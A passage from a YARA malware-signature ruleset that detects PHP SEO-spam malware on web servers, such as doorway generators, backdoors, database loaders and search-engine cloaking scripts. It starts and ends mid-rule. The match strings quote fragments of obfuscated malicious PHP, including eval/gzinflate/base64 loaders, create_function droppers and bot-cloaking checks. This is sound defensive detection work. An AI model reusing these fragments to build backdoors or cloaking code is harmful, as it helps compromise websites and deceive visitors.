{
    strings:
        $trigger = "= \"http://\".$domain.$path;"
        $php_spamseo_crypper_001_r0 = /\"\/index\/\?[\d]{8}/
    condition:
        $trigger and PR06014 and PR01401 and $php_spamseo_crypper_001_r0
}

// MANUAL FIX NECESSARY
private rule PR06015 : trigger
{
    strings:
        $ps0 = "$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] :"
    condition:
        $ps0
}

rule php_spamseo_crypper_002 : spamseo
{
    strings:
        $trigger = "$string = '<script type=\"text/javascript\">';"
        $php_spamseo_crypper_002_r0 = /\"\/index\/\?[\d]{8}/
    condition:
        $trigger and PR06015 and PR01401 and $php_spamseo_crypper_002_r0
}

// MANUAL FIX NECESSARY
rule php_spamseo_crypper_004 : spamseo
{
    strings:
        $trigger = "}if(!$_COOKIE[base64_decode"
        $php_spamseo_crypper_004_r0 = /\"\/index\/\?[\d]{8}/
    condition:
        $trigger and PR01401 and $php_spamseo_crypper_004_r0
}

private rule PR06016 : trigger
{
    strings:
        $ps0 = "base64_decode('dys=')"
    condition:
        $ps0
}

rule php_spamseo_crypper_005 : spamseo
{
    strings:
        $trigger = "[base64_decode('ZG9tYWlu')"
    condition:
        $trigger and PR06016 and PR01415
}

private rule PR06017 : trigger
{
    strings:
        $ps0 = "fwrite($csached, $datalinks);"
    condition:
        $ps0
}

rule php_spamseo_datalinks_001 : spamseo
{
    strings:
        $trigger = "str_rot13"
    condition:
        $trigger and PR06017
}

private rule PR06018 : trigger
{
    strings:
        $ps0 = "add_action('init', create_function('', implode"
    condition:
        $ps0
}

rule php_spamseo_dbload_002 : spamseo
{
    strings:
        $trigger = "implode(\"\\n\", array_map(\"base64_decode\", unserialize"
    condition:
        $trigger and PR06018
}

rule php_spamseo_dbload_003 : spamseo
{
    strings:
        $trigger = "create_function('', implode(\"\\n\", unserialize(get_option("
    condition:
        $trigger and PR06018
}

rule php_spamseo_dbload_004 : spamseo
{
    strings:
        $trigger = "create_function('', get_optionsjoom('joomplaupdateopt'));"
    condition:
        $trigger
}

private rule PR06019 : trigger
{
    strings:
        $ps0 = "$usql = \"INSERT INTO  \" . $prefix . \"options (option_name, option_value, autoload) VALUES('index_link', '\" . $wp_index_link . \"', 'yes');\";"
    condition:
        $ps0
}

rule php_spamseo_dbload_005 : spamseo
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR06019 and PR00397
}

private rule PR06020 : trigger
{
    strings:
        $ps0 = "/cron.php');"
    condition:
        $ps0
}

rule php_spamseo_do_backdoor_002 : spamseo
{
    strings:
        $trigger = ".'/wp-admin/includes/get.php');"
    condition:
        $trigger and PR06020
}

private rule PR06021 : trigger
{
    strings:
        $ps0 = ";$root_path = substr($absolutepath,"
    condition:
        $ps0
}

rule php_spamseo_do_backdoor_003 : spamseo
{
    strings:
        $trigger = "/cron.php');"
    condition:
        $trigger and PR06021 and PR02534
}

rule php_spamseo_doorwaygen_001 : spamseo
{
    strings:
        $trigger = "trim(file_get_contents(dirname(__FILE__).'/../bin/.zdaccess"
    condition:
        $trigger
}

rule php_spamseo_doorwaygen_002 : spamseo
{
    strings:
        $trigger = "array_unshift($data,119,105,110,100,111,119,46,116,111,112,46"
    condition:
        $trigger
}

rule php_spamseo_doorwaygen_003 : spamseo
{
    strings:
        $trigger = "check(dirname($_SERVER['DOCUMENT_ROOT'] . '/RND') , $dirs);"
    condition:
        $trigger
}

private rule PR06022 : trigger
{
    strings:
        $ps0 = "function Spider_RAND($length)"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_004 : spamseo
{
    strings:
        $trigger = "dir"
    condition:
        $trigger and PR06022
}

rule php_spamseo_doorwaygen_005 : spamseo
{
    strings:
        $trigger = "\").$user_agent_en.line_output(\""
    condition:
        $trigger
}

rule php_spamseo_doorwaygen_006 : spamseo
{
    strings:
        $trigger = "if(strpos(\"qqq \".$thisdoorfilename, \"?com=botdetected\")){"
    condition:
        $trigger and PR01401
}

rule php_spamseo_doorwaygen_008 : spamseo
{
    strings:
        $trigger = "getContent($myHost, $pathOnMyHost.$path, $template, $pathToDor);"
    condition:
        $trigger and PR00092
}

private rule PR06023 : trigger
{
    strings:
        $ps0 = "\"bot\")===false || $cloakornotcloak==\"no\""
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_009 : spamseo
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR06023
}

private rule PR06024 : trigger
{
    strings:
        $ps0 = "REMOTE_ADDR|HTTP_REFERER|HTTP_USER_AGENT|\\"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_010 : spamseo
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR06024
}

rule php_spamseo_doorwaygen_011 : spamseo
{
    strings:
        $trigger = "$c2.\"admintask.txt\",\"kodirovka\""
    condition:
        $trigger and PR00265
}

private rule PR06025 : trigger
{
    strings:
        $ps0 = "$relink_mas[$relink_n]."
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_012 : spamseo
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR06025
}

rule php_spamseo_doorwaygen_014 : spamseo
{
    strings:
        $trigger = "thisdoorwayurl=\\\"&clurl=\\\".trim(\\$thisdoorwayurl);"
    condition:
        $trigger
}

private rule PR06026 : trigger
{
    strings:
        $ps0 = "$querystring; ob_clean(); $filedata =theUrlContent($furl); echo $filedata; exit;"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_015 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06026 and PR01569
}

rule php_spamseo_doorwaygen_017 : spamseo
{
    strings:
        $trigger = "=base64_decode('YmluZ2JvdA==');$"
    condition:
        $trigger
}

private rule PR06027 : trigger
{
    strings:
        $ps0 = ": BLACK_ANG3L :"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_019 : spamseo
{
    strings:
        $trigger = "config"
    condition:
        $trigger and PR06027
}

private rule PR06028 : trigger
{
    strings:
        $ps0 = "if(empty($html)){\"<p align='center'><font color='red'>"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_020 : spamseo
{
    strings:
        $trigger = "function Reads($url){"
    condition:
        $trigger and PR06028 and PR01431
}

rule php_spamseo_doorwaygen_021 : spamseo
{
    strings:
        $trigger = "$Content_mb=file_get_contents($Remote_server.\"/index.php?host=\""
    condition:
        $trigger
}

private rule PR06029 : trigger
{
    strings:
        $ps0 = ". DIRECTORY_SEPARATOR . $"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_022 : spamseo
{
    strings:
        $trigger = ")>5000) { break; }"
    condition:
        $trigger and PR06029 and PR01799
}

private rule PR06030 : trigger
{
    strings:
        $ps0 = "die('>UP_OK<');"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_023 : spamseo
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\""
    condition:
        $trigger and PR06030
}

private rule PR06031 : trigger
{
    strings:
        $ps0 = "PRENAME"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_024 : spamseo
{
    strings:
        $trigger = "define(\"DOMTXT\",\"http://"
    condition:
        $trigger and PR06031 and PR01401
}

rule php_spamseo_doorwaygen_024_02 : spamseo
{
    strings:
        $trigger = "$str_hm = curl_get_from_webpage_one_time(\"\");"
    condition:
        $trigger and PR01458
}

private rule PR06032 : trigger
{
    strings:
        $ps0 = "CURLOPT_REFERER, \"http://www.googlebot.com/bot.html\""
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_025 : spamseo
{
    strings:
        $trigger = "if(stristr($reqstr,\"jquery\")==false && stristr($reqstr,\"ckeditor\")==false"
    condition:
        $trigger and PR06032
}

rule php_spamseo_doorwaygen_026 : spamseo
{
    strings:
        $trigger = "{manytext_bing}"
    condition:
        $trigger and PR00080
}

rule php_spamseo_doorwaygen_028 : spamseo
{
    strings:
        $trigger = "Parasite.php?\",$nhhtml);}"
    condition:
        $trigger and PR00080
}

private rule PR06033 : trigger
{
    strings:
        $ps0 = "str_replace($url,$_SERVER['HTTP_HOST'].$path_to_dor,$html);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_029 : spamseo
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR06033
}

private rule PR06034 : trigger
{
    strings:
        $ps0 = "$info='<a href='.'\"'.$_POST[\"title\"].'.html'.'\">'.$_POST[\"title\"].'</a></br>';"
    condition:
        $ps0
}

private rule PR06035 : trigger
{
    strings:
        $ps0 = "if(fwrite($f,stripcslashes($_POST[\"c\"]))){"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_030 : spamseo
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR06034 and PR06035
}

rule php_spamseo_doorwaygen_031 : spamseo
{
    strings:
        $trigger = "$neirongx = file_get_contents($wangzhang.'site_map.php?&pages='.$aa."
    condition:
        $trigger and PR00080
}

rule php_spamseo_doorwaygen_032 : spamseo
{
    strings:
        $trigger = "file_put_contents($this->docRoot.'/' . $this->subFolder.'/' . $hash . '.txt', $template);"
    condition:
        $trigger and PR00080
}

rule php_spamseo_doorwaygen_033 : spamseo
{
    strings:
        $trigger = "echo '<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0;url='.$jumpcode.'\"></head><body></body></html>';"
    condition:
        $trigger
}

rule php_spamseo_doorwaygen_033_02 : spamseo
{
    strings:
        $trigger = "array('id'=>\"http://\".$domain.$path.\"?wp-content"
    condition:
        $trigger and PR00042
}

rule php_spamseo_doorwaygen_034 : spamseo
{
    strings:
        $trigger = "=str_rot13(chr(114).chr(105).chr(110).chr(121));eval(strrev('};)"
    condition:
        $trigger
}

private rule PR06036 : trigger
{
    strings:
        $ps0 = "include($d_path.$files[2]);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_035 : spamseo
{
    strings:
        $trigger = "$_SERVER['HTTP_USER_AGENT']"
    condition:
        $trigger and PR06036
}

rule php_spamseo_doorwaygen_036 : spamseo
{
    strings:
        $trigger = "=file_get_contents($dor_dir);"
    condition:
        $trigger
}

rule php_spamseo_doorwaygen_037 : spamseo
{
    strings:
        $trigger = "if(CheckAgt($spi)== '1'){"
    condition:
        $trigger and PR00092
}

rule php_spamseo_doorwaygen_038 : spamseo
{
    strings:
        $trigger = "file_put_contents($seurlfile, base64_encode($savedata));"
    condition:
        $trigger
}

rule php_spamseo_doorwaygen_039 : spamseo
{
    strings:
        $trigger = "preg_match_all(\"/<content>(.*?)<\\/content>/s\", $sOutContent, $lssArrayMatches);"
    condition:
        $trigger and PR00092
}

private rule PR06037 : trigger
{
    strings:
        $ps0 = "str_replace(\"[BKEYWORD]\", stripslashes($_POST['Title']),"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_040 : spamseo
{
    strings:
        $trigger = "if ($_COOKIE['wp_defined'] != $passwordhash) {"
    condition:
        $trigger and PR00273 and PR06037
}

private rule PR06038 : trigger
{
    strings:
        $ps0 = "$_image_folder_ = $folder_name.$firstName.$lastName.$folder_escape;"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_041 : spamseo
{
    strings:
        $trigger = "$featureInfo = $row['featureInfo'].\" \".base64_decode("
    condition:
        $trigger and PR06038
}

private rule PR06039 : trigger
{
    strings:
        $ps0 = "sync_htaccess($htaccess_rule"
    condition:
        $ps0
}

private rule PR06040 : trigger
{
    strings:
        $ps0 = "header('Content-Type:"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_042 : spamseo
{
    strings:
        $trigger = "function outScript"
    condition:
        $trigger and PR06039 and PR01021 and PR06040 and PR01431
}

private rule PR06041 : trigger
{
    strings:
        $ps0 = "chr("
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_043 : spamseo
{
    strings:
        $trigger = "$a',strrev(';)a$(lave'));"
    condition:
        $trigger and PR01503 and PR06041
}

rule php_spamseo_doorwaygen_043_02 : spamseo
{
    strings:
        $trigger = "create_function('$a',s"
    condition:
        $trigger and PR01503 and PR01504
}

private rule PR06042 : trigger
{
    strings:
        $ps0 = "mkdir(\"$dirname\", 0777);"
    condition:
        $ps0
}

private rule PR06043 : trigger
{
    strings:
        $ps0 = "fwrite ($out, \"RewriteEngine On"
    condition:
        $ps0
}

private rule PR06044 : trigger
{
    strings:
        $ps0 = "echo \"<b><b><b>http://\".$_SERVER['SERVER_NAME'].\"/$dirname</b></b></b>\";"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_044 : spamseo
{
    strings:
        $trigger = "unlink($scriptname);"
    condition:
        $trigger and PR06042 and PR06043 and PR06044
}

private rule PR06045 : trigger
{
    strings:
        $ps0 = "$web = str_replace('www.','',$_SERVER['HTTP_HOST']);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_045 : spamseo
{
    strings:
        $trigger = "$zip->addFile('index.txt');"
    condition:
        $trigger and PR02803 and PR06045
}

private rule PR06046 : trigger
{
    strings:
        $ps0 = "explode"
    condition:
        $ps0
}

private rule PR06047 : trigger
{
    strings:
        $ps0 = "@'$"
    condition:
        $ps0
}

private rule PR06048 : trigger
{
    strings:
        $ps0 = "lineid"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046 : spamseo
{
    strings:
        $trigger = "x5"
    condition:
        $trigger and PR06046 and PR00058 and PR01818 and PR06047 and PR06048
}

rule php_spamseo_doorwaygen_046_02 : spamseo
{
    strings:
        $trigger = "$urlrules"
    condition:
        $trigger and PR01818 and PR06046 and PR00058 and PR06048
}

rule php_spamseo_doorwaygen_046_03 : spamseo
{
    strings:
        $trigger = "$returnVal=str_replace_once(\"$\",chr(rand("
    condition:
        $trigger and PR01818
}

private rule PR06049 : trigger
{
    strings:
        $ps0 = "{function str_ireplace($from,$to,$string){return trim"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_04 : spamseo
{
    strings:
        $trigger = "${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x"
    condition:
        $trigger and PR01818 and PR06049
}

rule php_spamseo_doorwaygen_046_05 : spamseo
{
    strings:
        $trigger = "/junchi.php?yid=%d&lid=%d&jumpurl=%d"
    condition:
        $trigger and PR01818 and PR06046 and PR00058 and PR06048
}

rule php_spamseo_doorwaygen_046_06 : spamseo
{
    strings:
        $trigger = "!=''?preg_replace(sprintf(\"/^%s\\/\\??/si\","
    condition:
        $trigger and PR06046
}

private rule PR06050 : trigger
{
    strings:
        $ps0 = "_INJECTED"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_07 : spamseo
{
    strings:
        $trigger = "${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x"
    condition:
        $trigger and PR01818 and PR06050
}

private rule PR06051 : trigger
{
    strings:
        $ps0 = "if(is_numeric($_GET[\\'sitemap_num\\']))"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_09 : spamseo
{
    strings:
        $trigger = "${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x"
    condition:
        $trigger and PR01818 and PR06051
}

private rule PR06052 : trigger
{
    strings:
        $ps0 = "//header('Content-Type:text"
    condition:
        $ps0
}

private rule PR06053 : trigger
{
    strings:
        $ps0 = "str_ireplac"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_10 : spamseo
{
    strings:
        $trigger = "${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x"
    condition:
        $trigger and PR01818 and PR06052 and PR06053
}

private rule PR06054 : trigger
{
    strings:
        $ps0 = "if(isset(${\"\\x5f\\x53\\x45\\x52\\x56\\x45\\x52\"}[\"\\x52\\x45\\x51\\x55\\x45\\x53\\x54\\x5f\\x53\\x43\\x48\\x45\\x4d\\x45"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_12 : spamseo
{
    strings:
        $trigger = "${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x"
    condition:
        $trigger and PR01818 and PR06054
}

private rule PR06055 : trigger
{
    strings:
        $ps0 = "function find_secret_dir($root"
    condition:
        $ps0
}

private rule PR06056 : trigger
{
    strings:
        $ps0 = "function find_uri_ltp_val_file($req_uri)"
    condition:
        $ps0
}

private rule PR06057 : trigger
{
    strings:
        $ps0 = "function decrypt_str($str)"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_14 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06055 and PR06056 and PR05136 and PR06057
}

private rule PR06058 : trigger
{
    strings:
        $ps0 = "foreach(${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_15 : spamseo
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR06058 and PR05490 and PR05491
}

// MANUAL FIX NECESSARY
rule php_spamseo_doorwaygen_046_16 : spamseo
{
    strings:
        $trigger = "O0_"
        $php_spamseo_doorwaygen_046_16_r0 = /(\$[0O_]+[\s]*=[\s]*('[^']+'|[\d]+);[\s]*){3,}\$[0O_]+[\s]*=[\s]*array\([^\)]+\);+[\s]*(\$[0O_]+[\s]*=[^;]+;[\s]*)+\?>/
    condition:
        $trigger and PR01179 and $php_spamseo_doorwaygen_046_16_r0
}

private rule PR06059 : trigger
{
    strings:
        $ps0 = "] as $header){header($header);}echo $"
    condition:
        $ps0
}

private rule PR06060 : trigger
{
    strings:
        $ps0 = "\\x73\\x65\\x72\\x76\\x65\\x72\\x5f\\x64\\x6f\\x6d\\x61\\x69\\x6e"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_17 : spamseo
{
    strings:
        $trigger = "0O0"
    condition:
        $trigger and PR06059 and PR06060
}

private rule PR06061 : trigger
{
    strings:
        $ps0 = "=array('domain'=>$"
    condition:
        $ps0
}

private rule PR06062 : trigger
{
    strings:
        $ps0 = "\"]:''):'/';$"
    condition:
        $ps0
}

private rule PR06063 : trigger
{
    strings:
        $ps0 = "isset(${\"\\x5f\\x53\\x45\\x52\\x56\\x45\\x52\"}"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_18 : spamseo
{
    strings:
        $trigger = "sprintf($"
    condition:
        $trigger and PR00507 and PR06061 and PR06062 and PR06063
}

private rule PR06064 : trigger
{
    strings:
        $ps0 = "=NULL,$O"
    condition:
        $ps0
}

private rule PR06065 : trigger
{
    strings:
        $ps0 = "sprintf($"
    condition:
        $ps0
}

private rule PR06066 : trigger
{
    strings:
        $ps0 = "=urldecode(\"%"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_19 : spamseo
{
    strings:
        $trigger = "=array('domain'=>$"
    condition:
        $trigger and PR06064 and PR06065 and PR06063 and PR06066 and PR00507
}

// MANUAL FIX NECESSARY
private rule PR06067 : trigger
{
    strings:
        $ps0 = "='.';"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_046_20 : spamseo
{
    strings:
        $trigger = "='';"
        $php_spamseo_doorwaygen_046_20_r0 = /\$[\w]+[\s]*=[\s]*'[\w]+';[\s]*(\$[\w]+[\s]*=[\s]*[^\n;]+;[\s]*){2,}eval\([\s]*\$[0O]+[\s]*\([^;]+\);[\s]*/
    condition:
        $trigger and PR01585 and PR05295 and PR06067 and PR05292 and PR05345 and PR00029 and $php_spamseo_doorwaygen_046_20_r0
}

private rule PR06068 : trigger
{
    strings:
        $ps0 = ", \"php\")) AND (!strpos("
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_047 : spamseo
{
    strings:
        $trigger = "(str_word_count($a)>3) echo $a.\"<br>\";"
    condition:
        $trigger and PR01401 and PR00113 and PR06068
}

private rule PR06069 : trigger
{
    strings:
        $ps0 = "$body= file_get_contents($url_full);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_048 : spamseo
{
    strings:
        $trigger = "$file_extend=\".html\";"
    condition:
        $trigger and PR06069
}

private rule PR06070 : trigger
{
    strings:
        $ps0 = "';eval($"
    condition:
        $ps0
}

private rule PR06071 : trigger
{
    strings:
        $ps0 = "(\"cHJlZ19yZXBsYWNlKCIv"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_049 : spamseo
{
    strings:
        $trigger = "='b"
    condition:
        $trigger and PR06070 and PR06071 and PR01411
}

private rule PR06072 : trigger
{
    strings:
        $ps0 = "$insertafter = $html->find($CONFIG['insertafter']);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_052 : spamseo
{
    strings:
        $trigger = "User-Agent"
    condition:
        $trigger and PR06072
}

private rule PR06073 : trigger
{
    strings:
        $ps0 = ";$z[1]=\""
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_053 : spamseo
{
    strings:
        $trigger = "$f[1]=\""
    condition:
        $trigger and PR06073
}

rule php_spamseo_doorwaygen_054 : spamseo
{
    strings:
        $trigger = "doorgen2/note"
    condition:
        $trigger and PR00203
}

private rule PR06074 : trigger
{
    strings:
        $ps0 = "echo \":::NICE:::{$links[$i2]['login']};{$"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_055 : spamseo
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR06074
}

private rule PR06075 : trigger
{
    strings:
        $ps0 = "if($_GET['id']=="
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_056 : spamseo
{
    strings:
        $trigger = "=(htmlspecialchars(file_get_contents("
    condition:
        $trigger and PR01021 and PR06075
}

private rule PR06076 : trigger
{
    strings:
        $ps0 = "if(isset($_POST['action']) && (isset($_POST['key']) && $_POST['key']==$this->key) && isset($_POST["
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_057 : spamseo
{
    strings:
        $trigger = "base64_decode($_POST["
    condition:
        $trigger and PR06076
}

private rule PR06077 : trigger
{
    strings:
        $ps0 = "$wp_nonce);if(isset($wpautop"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_058 : spamseo
{
    strings:
        $trigger = "POST"
    condition:
        $trigger and PR06077
}

rule php_spamseo_doorwaygen_059 : spamseo
{
    strings:
        $trigger = "echo '<bad_update>\\'cant open index file for writing"
    condition:
        $trigger and PR00355 and PR00357 and PR01431
}

rule php_spamseo_doorwaygen_061 : spamseo
{
    strings:
        $trigger = "9ICRyb290LiIvX2Rvb3J3YX"
    condition:
        $trigger and PR00265
}

private rule PR06078 : trigger
{
    strings:
        $ps0 = "$ratel->init($ruri, $host, $is_bot);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_062 : spamseo
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR06078 and PR00397
}

private rule PR06079 : trigger
{
    strings:
        $ps0 = "=\"<meta name='google-site-verification' content='$"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_063 : spamseo
{
    strings:
        $trigger = ",'w') or die (\"Error opening file"
    condition:
        $trigger and PR01746 and PR01490 and PR06079
}

rule php_spamseo_doorwaygen_064 : spamseo
{
    strings:
        $trigger = "$needvalue=mysqli_query($dbcon,$sql);$needvalue=mysqli_fetch_array($needvalue);"
    condition:
        $trigger and PR00732
}

private rule PR06080 : trigger
{
    strings:
        $ps0 = "$sitecode=str_ireplace($permalink,\"#\",$sitecode);echo"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_064_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR06080
}

rule php_spamseo_doorwaygen_065 : spamseo
{
    strings:
        $trigger = "{door-home}','{donor-home}"
    condition:
        $trigger
}

private rule PR06081 : trigger
{
    strings:
        $ps0 = "echo $client->getContent();"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_066 : spamseo
{
    strings:
        $trigger = "$_POST[\"upd\"])) $client->update_client();"
    condition:
        $trigger and PR00080 and PR06081
}

rule php_spamseo_doorwaygen_067 : spamseo
{
    strings:
        $trigger = "fopen(\"$dirname/.htaccess\", \"w\");"
    condition:
        $trigger and PR01458
}

private rule PR06082 : trigger
{
    strings:
        $ps0 = "$codevyp=true;"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_068 : spamseo
{
    strings:
        $trigger = "<a href="
    condition:
        $trigger and PR06082
}

private rule PR06083 : trigger
{
    strings:
        $ps0 = "/i',$_SERVER['HTTP_USER_AGENT'])){"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_068_02 : spamseo
{
    strings:
        $trigger = "echo file_get_contents(\"http"
    condition:
        $trigger and PR06083
}

rule php_spamseo_doorwaygen_069 : spamseo
{
    strings:
        $trigger = "echocrond($LoadLogs . 'c');"
    condition:
        $trigger and PR00092
}

private rule PR06084 : trigger
{
    strings:
        $ps0 = "Referer: http://{$url['host']}"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_070 : spamseo
{
    strings:
        $trigger = "if ($type == 'html' && strpos($result, \"<!-- a:\")"
    condition:
        $trigger and PR06084 and PR01637
}

private rule PR06085 : trigger
{
    strings:
        $ps0 = "$get_url = $api.\"?bot=id&shkey=\".$shkey.\"&act=1\".\"&id=\".$id.\"&suffix=\". $suffix .\"&md5=\".$url_md5"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_071 : spamseo
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR01021 and PR06085 and PR01431
}

private rule PR06086 : trigger
{
    strings:
        $ps0 = "php_display($remote)"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_072 : spamseo
{
    strings:
        $trigger = "echo $content"
    condition:
        $trigger and PR06086 and PR00070
}

private rule PR06087 : trigger
{
    strings:
        $ps0 = "CreateFile(\"content.php\",$FileCon);"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_073 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06087 and PR00355 and PR00357
}

private rule PR06088 : trigger
{
    strings:
        $ps0 = "if(preg_match(\"/googlebot|slurp|msnbot|bingbot/i\", getenv(\"HTTP_USER_AGENT\")"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_074 : spamseo
{
    strings:
        $trigger = "REQUE"
    condition:
        $trigger and PR01021 and PR00397 and PR06088
}

private rule PR06089 : trigger
{
    strings:
        $ps0 = "str_ireplace(\"window|href|location)\",\"\",$codes)"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_075 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06089 and PR00355 and PR00357
}

rule php_spamseo_doorwaygen_076 : spamseo
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('U8n3z7dNr8rMS8t"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_spamseo_doorwaygen_077 : spamseo
{
    strings:
        $trigger = "create_function(\"\","
        $php_spamseo_doorwaygen_077_r0 = /\$[\w]+[\s]*=[\s]*\$[\w]+\(\$[\w]+\(\$[\w]+\)\);[\s]*\$[\w]+[\s]*=[\s]*create_function\(\"\",[\s]*\$[\w]+\);[\s]*\$[\w]+\(\);/
    condition:
        $trigger and $php_spamseo_doorwaygen_077_r0
}

private rule PR06090 : trigger
{
    strings:
        $ps0 = "{$parts['host']}\\r\\n"
    condition:
        $ps0
}

private rule PR06091 : trigger
{
    strings:
        $ps0 = "$page .= isset($parts["
    condition:
        $ps0
}

private rule PR06092 : trigger
{
    strings:
        $ps0 = "function_exists('is_user_logged_in'))"
    condition:
        $ps0
}

private rule PR06093 : trigger
{
    strings:
        $ps0 = "->init("
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_078 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06090 and PR02212 and PR06091 and PR06092 and PR06093 and PR00357
}

private rule PR06094 : trigger
{
    strings:
        $ps0 = "if (window!=top) {top.location.href = url;} else { document.location= url;} } window.setTimeout("
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_079 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06094 and PR00355 and PR00357
}

private rule PR06095 : trigger
{
    strings:
        $ps0 = "\\x63\\x61\\x6c\\x6c\\x5f\\x75\\x73\\x65\\x72\\x5f\\x66\\x75\\x6e\\x63"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_080 : spamseo
{
    strings:
        $trigger = "\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x27$"
    condition:
        $trigger and PR06095
}

private rule PR06096 : trigger
{
    strings:
        $ps0 = "$tab = $tablets[rand(0, count($tablets))]; echo"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_081 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06096
}

private rule PR06097 : trigger
{
    strings:
        $ps0 = "KClickClient"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_083 : spamseo
{
    strings:
        $trigger = "$checkauthrule();"
    condition:
        $trigger and PR06097 and PR00391 and PR01514
}

private rule PR06098 : trigger
{
    strings:
        $ps0 = "isset($landing_url_parts['query'])"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_083_02 : spamseo
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR06098 and PR01021 and PR01569
}

rule php_spamseo_doorwaygen_083_03 : spamseo
{
    strings:
        $trigger = "readfile($name);"
    condition:
        $trigger and PR06097 and PR00391 and PR01514
}

private rule PR06099 : trigger
{
    strings:
        $ps0 = "if($_404 == true) echo die404();"
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_084 : spamseo
{
    strings:
        $trigger = "rows=20>'.file_get_contents(DATA.'log.txt"
    condition:
        $trigger and PR00732 and PR06099
}

private rule PR06100 : trigger
{
    strings:
        $ps0 = "@mysqli_fetch_array(mysqli_query($conn,'select count(*) as num from '.$table_prefix.'posts where post_status =\"publish\""
    condition:
        $ps0
}

rule php_spamseo_doorwaygen_085 : spamseo
{
    strings:
